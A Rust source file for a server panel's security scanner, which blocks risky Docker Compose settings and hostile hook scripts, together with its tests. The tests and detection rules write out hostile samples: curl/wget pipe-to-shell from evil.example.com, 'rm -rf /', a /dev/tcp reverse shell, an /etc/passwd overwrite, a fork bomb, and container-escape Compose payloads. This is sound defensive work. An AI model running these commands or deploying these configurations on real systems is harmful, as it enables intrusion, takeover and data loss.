// 安全扫描数据模型与端口 trait 定义位于 application 层（六边形），此处重新导出。
pub use crate::application::app_store_ports::{ScanFinding, ScanResult, Severity};

/// 宿主敏感路径：bind 挂载这些路径（或其子路径）即视为高危。`/` 单独处理（精确匹配）。
const SENSITIVE_MOUNTS: &[&str] = &[
    "/etc",
    "/root",
    "/boot",
    "/proc",
    "/sys",
    "/dev",
    "/run",
    "/var/run",
    "/var/lib/docker",
    "/var/lib/containerd",
    "/usr",
    "/bin",
    "/sbin",
    "/lib",
    "/lib64",
    "/home",
];

/// 高危 capability（等价或接近宿主 root / 可逃逸容器）。
const DANGEROUS_CAPS: &[&str] = &[
    "ALL",
    "SYS_ADMIN",
    "SYS_MODULE",
    "SYS_PTRACE",
    "SYS_RAWIO",
    "SYS_BOOT",
    "SYS_TIME",
    "DAC_READ_SEARCH",
    "DAC_OVERRIDE",
    "NET_ADMIN",
    "BPF",
    "PERFMON",
    "MAC_ADMIN",
    "MAC_OVERRIDE",
];

/// 取出 YAML 标签包裹的内层值（`!!bool true` 等）。
fn untag(v: &serde_yaml::Value) -> &serde_yaml::Value {
    match v {
        serde_yaml::Value::Tagged(t) => untag(&t.value),
        other => other,
    }
}

/// compose 布尔字段的真值判断（兼容字符串形式 `"true"`，compose 插值后会转布尔）。
fn is_truthy(v: &serde_yaml::Value) -> bool {
    match untag(v) {
        serde_yaml::Value::Bool(b) => *b,
        serde_yaml::Value::String(s) => {
            matches!(
                s.trim().to_ascii_lowercase().as_str(),
                "true" | "yes" | "on" | "1"
            )
        }
        serde_yaml::Value::Number(n) => n.as_i64() == Some(1),
        _ => false,
    }
}

fn as_str(v: &serde_yaml::Value) -> Option<&str> {
    match untag(v) {
        serde_yaml::Value::String(s) => Some(s.as_str()),
        _ => None,
    }
}

/// 把标量或序列统一展开为字符串列表（`cap_add: SYS_ADMIN` / `[SYS_ADMIN]` 两种写法）。
fn str_list(v: &serde_yaml::Value) -> Vec<String> {
    match untag(v) {
        serde_yaml::Value::Sequence(seq) => seq
            .iter()
            .filter_map(|x| as_str(x).map(str::to_string))
            .collect(),
        serde_yaml::Value::String(s) => vec![s.clone()],
        _ => Vec::new(),
    }
}

/// 词法归一化宿主路径：合并重复 `/`、解析 `.`/`..`、去尾部 `/`（不访问文件系统）。
fn normalize_host_path(raw: &str) -> String {
    let mut parts: Vec<&str> = Vec::new();
    for seg in raw.split('/') {
        match seg {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            s => parts.push(s),
        }
    }
    format!("/{}", parts.join("/"))
}

/// 判定 bind 挂载源是否敏感；返回用于展示的归一化路径。
fn sensitive_mount(source: &str) -> Option<(String, bool)> {
    let src = source.trim();
    if src.starts_with('~') {
        return Some((src.to_string(), false));
    }
    if !src.starts_with('/') {
        return None; // 命名卷 / 相对路径（位于应用目录内）
    }
    let norm = normalize_host_path(src);
    if norm == "/" || norm.ends_with("/docker.sock") {
        return Some((norm, true)); // 关键：整盘或 Docker 控制面
    }
    SENSITIVE_MOUNTS
        .iter()
        .find(|m| norm == **m || norm.starts_with(&format!("{}/", m)))
        .map(|_| (norm, false))
}

/// 提取服务 volumes 中所有 bind 挂载源（短语法 `src:dst[:mode]` 与长语法 `source:`）。
fn bind_sources(volumes: &serde_yaml::Value) -> Vec<String> {
    let serde_yaml::Value::Sequence(seq) = untag(volumes) else {
        return Vec::new();
    };
    seq.iter()
        .filter_map(|item| match untag(item) {
            serde_yaml::Value::String(s) => Some(s.split(':').next().unwrap_or("").to_string()),
            serde_yaml::Value::Mapping(m) => {
                let kind = m.get("type").and_then(as_str).unwrap_or("bind");
                if kind != "bind" && kind != "volume" {
                    return None;
                }
                m.get("source").and_then(as_str).map(str::to_string)
            }
            _ => None,
        })
        .collect()
}

/// 服务级结构化安全扫描（见 [`scan_compose_with_registries`] 的分级说明）。
fn scan_services(compose_yaml: &str, confirmed_risky: bool, result: &mut ScanResult) {
    let mut doc: serde_yaml::Value = match serde_yaml::from_str(compose_yaml) {
        Ok(v) => v,
        Err(e) => {
            // 不可解析即不可审计；docker compose 同样拒绝，直接阻断（不受确认开关影响）
            result.findings.push(ScanFinding {
                severity: Severity::Block,
                message: format!("compose 文件无法解析，已拒绝安装: {}", e),
                item: "yaml".into(),
            });
            return;
        }
    };
    // 展开 YAML 合并键（`<<: *anchor`），防止把高危字段藏进锚点
    if let Err(e) = doc.apply_merge() {
        result.findings.push(ScanFinding {
            severity: Severity::Block,
            message: format!("compose 合并键展开失败，已拒绝安装: {}", e),
            item: "yaml".into(),
        });
        return;
    }
    let Some(services) = doc.get("services").map(untag).and_then(|v| v.as_mapping()) else {
        return;
    };

    let severity = if confirmed_risky {
        Severity::High
    } else {
        Severity::Block
    };
    let mut push_risky = |critical: bool, message: String, item: String| {
        result.findings.push(ScanFinding {
            severity,
            // 关键项（整盘/Docker 控制面/特权/SYS_ADMIN/pid host）在消息中显式标注
            message: if critical {
                format!("【关键】{message}")
            } else {
                message
            },
            item,
        });
    };

    for (name, svc) in services {
        let name = as_str(name).unwrap_or("?");
        let Some(svc) = untag(svc).as_mapping() else {
            continue;
        };
        let get = |k: &str| svc.get(k);

        if get("privileged").is_some_and(is_truthy) {
            push_risky(
                true,
                format!("服务 {name} 以 privileged 特权模式运行，具有宿主 root 权限"),
                "privileged: true".into(),
            );
        }
        for key in ["network_mode", "pid", "ipc", "userns_mode", "uts"] {
            if get(key)
                .and_then(as_str)
                .is_some_and(|v| v.trim() == "host")
            {
                push_risky(
                    key == "pid",
                    format!(
                        "服务 {name} 使用 {key}: host，与宿主共享命名空间（可访问仅监听 127.0.0.1 的服务/宿主进程）"
                    ),
                    format!("{key}: host"),
                );
            }
        }
        if let Some(caps) = get("cap_add") {
            for cap in str_list(caps) {
                let norm = cap.trim().to_ascii_uppercase();
                let norm = norm.strip_prefix("CAP_").unwrap_or(&norm).to_string();
                if DANGEROUS_CAPS.contains(&norm.as_str()) {
                    push_risky(
                        norm == "ALL" || norm == "SYS_ADMIN",
                        format!("服务 {name} 申请高危 capability {norm}"),
                        format!("cap_add: {norm}"),
                    );
                }
            }
        }
        let has_devices = get("devices").is_some_and(|d| match untag(d) {
            serde_yaml::Value::Sequence(s) => !s.is_empty(),
            serde_yaml::Value::Null => false,
            _ => true,
        });
        if has_devices {
            push_risky(
                false,
                format!("服务 {name} 直通宿主设备（devices）"),
                "devices".into(),
            );
        }
        if let Some(opts) = get("security_opt") {
            for opt in str_list(opts) {
                let o = opt.to_ascii_lowercase().replace('=', ":");
                if o.contains("unconfined") || o.contains("label:disable") {
                    push_risky(
                        false,
                        format!("服务 {name} 关闭了容器安全隔离（security_opt: {opt}）"),
                        format!("security_opt: {opt}"),
                    );
                }
            }
        }
        if let Some(ext) = get("extends").map(untag).and_then(|v| v.as_mapping()) {
            if ext.get("file").is_some() {
                push_risky(
                    false,
                    format!("服务 {name} 通过 extends 引用外部文件，无法随本文件一并审计"),
                    "extends.file".into(),
                );
            }
        }
        if let Some(vols) = get("volumes") {
            for src in bind_sources(vols) {
                if let Some((path, critical)) = sensitive_mount(&src) {
                    push_risky(
                        critical,
                        format!("服务 {name} 挂载了敏感宿主机路径: {path}"),
                        path,
                    );
                }
            }
        }
    }
}

/// Compose 安全检查默认实现（实现 `ComposeSecurityScanner` 端口）。
pub struct DefaultComposeSecurityScanner;

impl DefaultComposeSecurityScanner {
    pub fn new() -> Self {
        Self
    }
}

impl Default for DefaultComposeSecurityScanner {
    fn default() -> Self {
        Self::new()
    }
}

impl crate::application::app_store_ports::ComposeSecurityScanner for DefaultComposeSecurityScanner {
    fn scan_compose(&self, compose_yaml: &str, confirmed_risky: bool) -> ScanResult {
        scan_compose(compose_yaml, confirmed_risky)
    }

    /// M-A Issue 1.3：带可配置镜像仓库白名单的扫描（额外白名单由 settings 提供）。
    fn scan_compose_with_registries(
        &self,
        compose_yaml: &str,
        confirmed_risky: bool,
        extra_registries: &[String],
    ) -> ScanResult {
        scan_compose_with_registries(compose_yaml, confirmed_risky, extra_registries)
    }

    fn ensure_restart_policy(&self, compose_yaml: &str) -> String {
        ensure_restart_policy(compose_yaml)
    }

    fn scan_script(&self, script: &str) -> ScanResult {
        scan_script(script)
    }
}

/// Compose 安全检查（默认内置白名单）。
pub fn scan_compose(compose_yaml: &str, confirmed_risky: bool) -> ScanResult {
    scan_compose_with_registries(compose_yaml, confirmed_risky, &[])
}

/// Compose 安全检查：返回按严重度分类的结果（可追加镜像仓库白名单）。
/// - 高危（未勾选「确认风险」→ Block；勾选后降为 High 告警）：
///   privileged、宿主敏感路径 bind 挂载（含 `/`、docker.sock）、host 网络/PID/IPC/userns
///   命名空间、危险 capability、`devices` 直通、关闭 seccomp/AppArmor/SELinux、跨文件 `extends`
/// - 无法解析的 compose（含多文档）：始终 Block（docker compose 同样无法部署，且无法审计）
/// - Low：镜像来自非白名单仓库 / `:latest`；Info：未固定 tag、缺 restart 策略
pub fn scan_compose_with_registries(
    compose_yaml: &str,
    confirmed_risky: bool,
    extra_registries: &[String],
) -> ScanResult {
    let mut result = ScanResult::default();

    // Doc/33 B-1：结构化扫描（serde_yaml 解析 + 合并键展开），取代旧的子串匹配——
    // 旧实现 `privileged:  true`（双空格）、`- /:/host`、长语法 `source: /etc`、
    // `cap_add: [SYS_ADMIN]`、`pid: host` 等均可绕过。
    scan_services(compose_yaml, confirmed_risky, &mut result);

    // 镜像仓库检查（内置白名单 + settings 可配置追加）
    let mut trusted_registries: Vec<&str> = vec![
        "docker.io",
        "ghcr.io",
        "quay.io",
        "registry.cn-hangzhou.aliyuncs.com",
    ];
    trusted_registries.extend(extra_registries.iter().map(|s| s.as_str()));
    for line in compose_yaml.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("image:") {
            let image = trimmed
                .trim_start_matches("image:")
                .trim()
                .trim_matches('"')
                .trim_matches('\'');
            let registry = image.split('/').next().unwrap_or(image);
            if image.contains('/')
                && !trusted_registries.contains(&registry)
                && !registry.contains('.')
                && !registry.contains(':')
            {
                // 如 "wordpress:6.7" 不带仓库前缀，视为 docker.io
                continue;
            }
            if !trusted_registries.contains(&registry)
                && registry.contains('.')
                && !registry.contains(":")
            {
                result.findings.push(ScanFinding {
                    severity: Severity::Low,
                    message: format!("镜像来自非白名单仓库: {}", image),
                    item: image.to_string(),
                });
            }
        }
    }

    // 质量规约（M-M1，Doc/20 §4.6）：禁用 :latest 标签——不可回滚不可复现。
    // 显式 latest 为 Low 告警；同时补充信息级提示未显式声明 tag 的情况。
    for line in compose_yaml.lines() {
        let trimmed = line.trim();
        if !trimmed.starts_with("image:") {
            continue;
        }
        let image = trimmed
            .trim_start_matches("image:")
            .trim()
            .trim_matches('"')
            .trim_matches('\'');
        let has_tag = image.rsplit('/').next().unwrap_or(image).contains(':');
        if image
            .rsplit('/')
            .next()
            .unwrap_or(image)
            .ends_with(":latest")
        {
            result.findings.push(ScanFinding {
                severity: Severity::Low,
                message: "镜像使用 :latest 标签，不可回滚不可复现（质量规约）".into(),
                item: image.to_string(),
            });
        } else if !has_tag {
            result.findings.push(ScanFinding {
                severity: Severity::Info,
                message: "镜像未显式声明 tag，建议固定版本号".into(),
                item: image.to_string(),
            });
        }
    }

    if !compose_yaml.to_lowercase().contains("restart:") {
        result.findings.push(ScanFinding {
            severity: Severity::Info,
            message: "未定义 restart 策略，将自动补充 unless-stopped".into(),
            item: "restart".into(),
        });
    }

    result
}

/// 自动为没有 restart 策略的 compose 补充 `restart: unless-stopped`（仅对顶层 services 缺省处理，
/// 简单实现：若整体无 restart 且存在 services 块，追加到首个服务）
/// 生命周期钩子脚本静态扫描（Doc/20 §4.3）。
///
/// 高危模式直接 Block（面板以高权限执行宿主机脚本，此类模式不可放行）：
/// - 递归强制删除根/系统目录（`rm -rf /`、`rm -rf /*`、`rm -rf ~`）
/// - 远程脚本管道执行（`curl … | sh`、`wget … | bash`）
/// - 写入系统关键文件（`/etc/passwd`、`/etc/shadow`、crontab 自启动）
/// - 反弹 shell（`/dev/tcp/`）
/// - fork 炸弹
///
/// `mkfs`/`dd of=/dev/*` 类破坏性命令为 High 告警（部分合法运维场景存在）。
pub fn scan_script(script: &str) -> crate::application::app_store_ports::ScanResult {
    use crate::application::app_store_ports::{ScanFinding, Severity};

    let mut result = crate::application::app_store_ports::ScanResult::default();
    let lower = script.to_lowercase();
    let mut block = |item: &str, message: String| {
        result.findings.push(ScanFinding {
            severity: Severity::Block,
            message,
            item: item.into(),
        });
    };

    // rm -rf 指向根目录/家目录（含 /*、~/、$HOME 变体）
    let rm_root = lower.split([';', '|', '&', '\n']).any(|seg| {
        let seg = seg.trim();
        (seg.starts_with("rm ") || seg.starts_with("sudo rm ") || seg.contains(" rm "))
            && seg.contains("-rf")
            && {
                let after = seg.split("-rf").nth(1).unwrap_or("").trim();
                let after = after.trim_start_matches(['"', '\'']);
                let after = after.split_whitespace().next().unwrap_or("");
                after == "/" || after == "/*" || after == "~" || after == "~/" || after == "$home"
            }
    });
    if rm_root {
        block(
            "rm -rf /",
            "脚本包含递归删除根目录/家目录的破坏性命令 (rm -rf /)".into(),
        );
    }

    if (lower.contains("curl") || lower.contains("wget"))
        && (lower.contains("| sh")
            || lower.contains("|sh")
            || lower.contains("| bash")
            || lower.contains("|bash"))
    {
        block(
            "curl|sh",
            "脚本包含远程脚本管道执行 (curl/wget … | sh/bash)，来源不可控".into(),
        );
    }

    if lower.contains("/etc/passwd") || lower.contains("/etc/shadow") || lower.contains("crontab") {
        block(
            "system file write",
            "脚本尝试写入系统关键文件或注册计划任务 (/etc/passwd|/etc/shadow|crontab)".into(),
        );
    }

    if lower.contains("/dev/tcp/") {
        block(
            "reverse shell",
            "脚本包含反弹 shell 特征 (/dev/tcp/)".into(),
        );
    }

    if lower.contains(":(){:|:&};:") || (lower.contains("fork()") && lower.contains("bomb")) {
        block("fork bomb", "脚本包含 fork 炸弹".into());
    }

    // mkfs / 裸 dd 写块设备：High 告警
    if lower.contains("mkfs") || lower.contains("dd if=") && lower.contains("of=/dev/") {
        result.findings.push(ScanFinding {
            severity: Severity::High,
            message: "脚本包含块设备格式化/覆写命令 (mkfs/dd of=/dev/*)".into(),
            item: "block device write".into(),
        });
    }

    result
}

pub fn ensure_restart_policy(compose_yaml: &str) -> String {
    if compose_yaml.to_lowercase().contains("restart:") {
        return compose_yaml.to_string();
    }
    if compose_yaml.contains("services:") {
        // 在第一个服务名下缩进插入 restart: unless-stopped
        let mut lines: Vec<&str> = compose_yaml.lines().collect();
        let mut inserted = false;
        let mut i = 0;
        while i < lines.len() - 1 {
            let cur = lines[i];
            let next = lines[i + 1];
            let cur_indent = cur.len() - cur.trim_start().len();
            if cur.trim_start().starts_with('-') && next.trim().is_empty() {
                i += 1;
                continue;
            }
            if cur.trim().is_empty() {
                i += 1;
                continue;
            }
            // 找到 services 下的第一个顶层服务（缩进 2 的空格，不以空格开头的是 services: 或注释）
            let trimmed = cur.trim_start();
            if cur_indent == 2
                && !trimmed.starts_with('#')
                && !trimmed.starts_with('-')
                && !trimmed.starts_with("services:")
            {
                lines.insert(i + 1, "    restart: unless-stopped");
                inserted = true;
                break;
            }
            i += 1;
        }
        if inserted {
            return lines.join("\n");
        }
    }
    compose_yaml.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAFE_COMPOSE: &str = r#"services:
  app:
    image: nginx:alpine
    ports:
      - "8080:80"
    restart: unless-stopped
"#;

    #[test]
    fn safe_compose_has_no_findings() {
        let result = scan_compose(SAFE_COMPOSE, false);
        assert!(!result.has_blockers());
        assert!(result.findings.is_empty());
    }

    #[test]
    fn latest_tag_low_warning() {
        // M-M1 质量规约：显式 :latest → Low 告警（不阻断）
        let yaml = "services:\n  app:\n    image: docker.io/library/nginx:latest\n    restart: unless-stopped\n";
        let result = scan_compose(yaml, false);
        assert!(!result.has_blockers());
        let f = result
            .findings
            .iter()
            .find(|f| f.item.contains(":latest"))
            .expect(":latest 应触发 Low 告警");
        assert_eq!(f.severity, Severity::Low);
        assert!(f.message.contains("latest"));
    }

    #[test]
    fn missing_tag_info_hint() {
        let yaml =
            "services:\n  app:\n    image: docker.io/library/nginx\n    restart: unless-stopped\n";
        let result = scan_compose(yaml, false);
        assert!(result
            .findings
            .iter()
            .any(|f| f.severity == Severity::Info && f.item.ends_with("nginx")));
    }

    #[test]
    fn pinned_tag_no_finding() {
        let yaml = "services:\n  app:\n    image: docker.io/library/wordpress:6.7\n    restart: unless-stopped\n";
        let result = scan_compose(yaml, false);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn privileged_blocks_by_default() {
        let yaml = "services:\n  app:\n    image: busybox\n    privileged: true\n";
        let result = scan_compose(yaml, false);
        assert!(result.has_blockers());
        assert_eq!(result.block_messages().len(), 1);
    }

    #[test]
    fn privileged_passes_when_confirmed() {
        let yaml = "services:\n  app:\n    image: busybox\n    privileged: true\n";
        let result = scan_compose(yaml, true);
        assert!(!result.has_blockers());
    }

    #[test]
    fn sensitive_mount_requires_confirmation() {
        // Doc/33 B-1：敏感挂载由「仅告警」收紧为「未确认即阻断」
        let yaml = "services:\n  app:\n    image: busybox\n    volumes:\n      - /etc:/host/etc\n";
        assert!(scan_compose(yaml, false).has_blockers());
        let result = scan_compose(yaml, true);
        assert!(!result.has_blockers());
        assert!(result
            .findings
            .iter()
            .any(|f| f.severity == Severity::High && f.item == "/etc"));
    }

    #[test]
    fn host_network_requires_confirmation() {
        let yaml = "services:\n  app:\n    image: busybox\n    network_mode: host\n";
        assert!(scan_compose(yaml, false).has_blockers());
        let result = scan_compose(yaml, true);
        assert!(!result.has_blockers());
        assert!(result
            .findings
            .iter()
            .any(|f| f.item == "network_mode: host"));
    }

    /// 旧子串扫描器的已知绕过载荷：结构化扫描后全部须在未确认时阻断。
    #[test]
    fn structural_scan_catches_known_bypasses() {
        let cases = [
            ("双空格 privileged", "services:\n  a:\n    image: busybox\n    privileged:  true\n"),
            ("字符串 privileged", "services:\n  a:\n    image: busybox\n    privileged: \"true\"\n"),
            ("标签 privileged", "services:\n  a:\n    image: busybox\n    privileged: !!bool true\n"),
            ("流式 privileged", "services: {a: {image: busybox, privileged: true}}\n"),
            ("锚点合并", "x-base: &b\n  privileged: true\nservices:\n  a:\n    <<: *b\n    image: busybox\n"),
            ("整盘挂载", "services:\n  a:\n    image: busybox\n    volumes:\n      - /:/host\n"),
            ("路径穿越挂载", "services:\n  a:\n    image: busybox\n    volumes:\n      - /opt/../etc:/x\n"),
            ("尾斜杠挂载", "services:\n  a:\n    image: busybox\n    volumes:\n      - /etc/:/x:ro\n"),
            ("/run 下的 docker.sock", "services:\n  a:\n    image: busybox\n    volumes:\n      - /run/docker.sock:/var/run/docker.sock\n"),
            ("长语法挂载", "services:\n  a:\n    image: busybox\n    volumes:\n      - type: bind\n        source: /root\n        target: /r\n"),
            ("cap_add 序列", "services:\n  a:\n    image: busybox\n    cap_add: [SYS_ADMIN]\n"),
            ("cap_add CAP_ 前缀", "services:\n  a:\n    image: busybox\n    cap_add:\n      - cap_sys_ptrace\n"),
            ("pid host", "services:\n  a:\n    image: busybox\n    pid: host\n"),
            ("设备直通", "services:\n  a:\n    image: busybox\n    devices:\n      - /dev/sda:/dev/sda\n"),
            ("关闭 seccomp", "services:\n  a:\n    image: busybox\n    security_opt:\n      - seccomp=unconfined\n"),
            ("家目录挂载", "services:\n  a:\n    image: busybox\n    volumes:\n      - ~/.ssh:/k\n"),
            ("多文档", "services:\n  a:\n    image: busybox\n---\nservices:\n  b:\n    image: busybox\n    privileged: true\n"),
        ];
        for (label, yaml) in cases {
            assert!(scan_compose(yaml, false).has_blockers(), "{label} 未被阻断");
        }
    }

    #[test]
    fn benign_mounts_and_caps_pass() {
        let yaml = "services:\n  a:\n    image: busybox:1.36\n    restart: always\n    cap_add: [NET_BIND_SERVICE, CHOWN]\n    volumes:\n      - ./data:/data\n      - appdata:/var/lib/app\n      - /opt/flamepanel/data/apps/a:/srv\n      - /etcetera:/x\n    security_opt:\n      - no-new-privileges:true\n";
        let result = scan_compose(yaml, false);
        assert!(!result.has_blockers(), "{:?}", result.findings);
    }

    #[test]
    fn normalize_host_path_is_lexical() {
        assert_eq!(normalize_host_path("/opt/../etc/"), "/etc");
        assert_eq!(
            normalize_host_path("//var//run/./docker.sock"),
            "/var/run/docker.sock"
        );
        assert_eq!(normalize_host_path("/../.."), "/");
    }

    #[test]
    fn unknown_registry_flagged_low() {
        let yaml = "services:\n  app:\n    image: myregistry.example.com/myapp:1.0\n";
        let result = scan_compose(yaml, false);
        assert!(result.findings.iter().any(|f| f.severity == Severity::Low));
    }

    #[test]
    fn missing_restart_gets_info() {
        let yaml = "services:\n  app:\n    image: nginx:alpine\n";
        let result = scan_compose(yaml, false);
        assert!(result.findings.iter().any(|f| f.severity == Severity::Info));
    }

    #[test]
    fn ensure_restart_policy_adds_policy() {
        let yaml = "services:\n  app:\n    image: nginx:alpine\n    ports:\n      - \"8080:80\"\n";
        let out = ensure_restart_policy(yaml);
        assert!(out.contains("restart: unless-stopped"));
        assert!(out.contains("services:"));
    }

    #[test]
    fn ensure_restart_policy_keeps_existing() {
        let out = ensure_restart_policy(SAFE_COMPOSE);
        assert_eq!(out, SAFE_COMPOSE);
    }

    // ─── 钩子脚本静态扫描（Doc/20 §4.3）──────────────────────────────────

    #[test]
    fn scan_script_clean_passes() {
        let script = "#!/bin/sh\necho preparing...\nmkdir -p /tmp/data\n";
        let result = scan_script(script);
        assert!(!result.has_blockers());
        assert!(result.findings.is_empty());
    }

    #[test]
    fn scan_script_rm_rf_root_blocks() {
        for bad in ["rm -rf /", "rm -rf /*", "sudo rm -rf ~", "rm  -rf  $HOME"] {
            let script = format!("#!/bin/sh\n{}\n", bad);
            let result = scan_script(&script);
            assert!(result.has_blockers(), "应阻断: {}", bad);
            assert!(result.block_messages()[0].contains("rm -rf"));
        }
    }

    #[test]
    fn scan_script_rm_rf_subdir_allows() {
        let script = "#!/bin/sh\nrm -rf ./cache\nrm -rf /tmp/old-data\n";
        let result = scan_script(script);
        assert!(!result.has_blockers());
    }

    #[test]
    fn scan_script_curl_pipe_sh_blocks() {
        let script = "#!/bin/sh\ncurl -fsSL https://evil.example.com/install.sh | sh\n";
        let result = scan_script(script);
        assert!(result.has_blockers());
    }

    #[test]
    fn scan_script_wget_pipe_bash_blocks() {
        let script = "wget -qO- http://x.example.com/i.sh | bash\n";
        let result = scan_script(script);
        assert!(result.has_blockers());
    }

    #[test]
    fn scan_script_sensitive_paths_block() {
        let script = "echo root:x:0:0 > /etc/passwd\n";
        assert!(scan_script(script).has_blockers());
        let script = "echo '0 3 * * * /bin/backup' | crontab -\n";
        assert!(scan_script(script).has_blockers(), "crontab 应阻断");
    }

    #[test]
    fn scan_script_reverse_shell_blocks() {
        let script = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
        assert!(scan_script(script).has_blockers());
    }

    #[test]
    fn scan_script_mkfs_high_not_block() {
        let script = "mkfs.ext4 /dev/sdb1\n";
        let result = scan_script(script);
        assert!(!result.has_blockers());
        assert!(result.findings.iter().any(|f| f.severity == Severity::High));
    }
}
